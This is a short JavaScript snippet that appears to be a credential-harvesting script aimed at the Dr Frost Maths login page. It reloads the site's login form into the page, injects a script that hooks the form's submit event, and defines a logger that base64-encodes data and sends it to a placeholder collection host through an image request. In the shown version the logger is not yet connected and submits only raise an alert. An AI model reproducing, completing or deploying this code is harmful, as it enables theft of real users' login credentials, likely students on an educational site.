(function() {
  let comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
  let bin = 'https://???/bin?data='

  let load = async path => document.write(
    await fetch(path)
    .then(response => response.text())
    .then(text => text + `
      <script>
        $('form[action*=login]').submit(alert) 
      </script>
    `)
  )

  let log = data => {
    new Image()
    .src = `${bin}${btoa(JSON.stringify(data))}`
  }
  
  load(`/login.php?url=${encodeURIComponent(comfort)}`)
})()
